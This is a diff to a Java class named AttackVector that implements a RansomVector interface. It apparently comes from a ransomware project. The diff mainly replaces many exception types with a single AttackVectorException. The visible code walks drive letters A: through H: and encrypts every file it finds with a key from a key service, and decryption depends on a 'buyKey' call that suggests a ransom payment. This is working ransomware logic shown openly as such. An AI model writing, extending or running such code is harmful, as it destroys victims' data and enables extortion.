@@ -11,13 +11,8 @@ import Agent.cryptFile.DecryptFile;
 import Agent.cryptFile.EncryptFile;
 import Agent.entites.AlgorithmsMap;
 import Agent.entites.CryptoKey;
-import Agent.exceptions.AlgorithmNotFoundException;
+import Agent.exceptions.AttackVectorException;
 import Agent.exceptions.CryptoException;
-import Agent.exceptions.HttpResException;
-import Agent.exceptions.InOutException;
-import Agent.exceptions.JsonException;
-import Agent.exceptions.KeyNotFoundException;
-import Agent.exceptions.PaddingException;
 import Agent.services.KeyService;
 import Agent.traversal.*;
 
@@ -26,34 +21,25 @@ public class AttackVector implements RansomVector {
 	private KeyService keyService;
 
 	@Override
-	public void encryptFileSystem() throws CryptoException, JsonException, HttpResException {
+	public void encryptFileSystem() throws AttackVectorException {
 		try {
 			cryptFileSystem(keyService.getKey(), new EncryptFile());
-		} catch (JsonException e) {
-			throw new JsonException("Wanted CryptoKey not found", e.getCause());
-		} catch (HttpResException e) {
-			throw new HttpResException("connection failed", e.getCause());
 		} catch (CryptoException e) {
-			throw new CryptoException("Encrypting the file-system failed", e.getCause());
-
+			throw new AttackVectorException("Encrypting the file-system failed", e.getCause());
 		}
 	}
 
 	@Override
-	public void decryptFileSystem() throws CryptoException, JsonException, HttpResException {
+	public void decryptFileSystem() throws AttackVectorException {
 		try {
 
 			cryptFileSystem(keyService.buyKey(), new DecryptFile());
-		} catch (JsonException e) {
-			throw new JsonException("Wanted CryptoKey not found", e.getCause());
-		} catch (HttpResException e) {
-			throw new HttpResException("connection failed", e.getCause());
 		} catch (CryptoException e) {
-			throw new CryptoException("Decrypting the file-system failed", e.getCause());
+			throw new AttackVectorException("Decrypting the file-system failed", e.getCause());
 		}
 	}
 
-	private void cryptFileSystem(CryptoKey key, CryptoOperation cryptFunc) throws CryptoException {
+	private void cryptFileSystem(CryptoKey key, CryptoOperation cryptFunc) throws AttackVectorException {
 		// Traverse<File> dfs = new DFS<File>();
 		// or
 		Traverse<File> bfs = new BFS<File>();
@@ -62,9 +48,8 @@ public class AttackVector implements RansomVector {
 		for (char i = 'A'; i <= 'H'; i++) {
 			try {
 				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
-			} catch (CryptoException e) {
-				throw new CryptoException("Traverse the whole file-system failed", e.getCause());
-
+			} catch (AttackVectorException e) {
+				throw new AttackVectorException("Could not crypt the whole file-system", e.getCause());
 			}
 		}
 	}
@@ -80,8 +65,7 @@ public class AttackVector implements RansomVector {
 	}
 
 	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
-			CryptoOperation cryptoFunc)
-			throws AlgorithmNotFoundException, PaddingException, KeyNotFoundException, CryptoException, InOutException {
+			CryptoOperation cryptoFunc) throws AttackVectorException {
 
 		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
 
@@ -105,17 +89,8 @@ public class AttackVector implements RansomVector {
 
 						try {
 							cryptoFunc.operate(key, file, crypto);
-						} catch (AlgorithmNotFoundException e) {
-							throw new AlgorithmNotFoundException("algorithm class not found", e.getCause());
-						} catch (PaddingException e) {
-							throw new PaddingException("padding went wrong", e.getCause());
-						} catch (KeyNotFoundException e) {
-							throw new KeyNotFoundException("key not found", e.getCause());
-						} catch (InOutException e) {
-							throw new InOutException("You do not have the premission to get this information",
-									e.getCause());
 						} catch (CryptoException e) {
-							throw new CryptoException("Problem crypting file", e.getCause());
+							throw new AttackVectorException("Could not crypt", e.getCause());
 						}
 
 					}
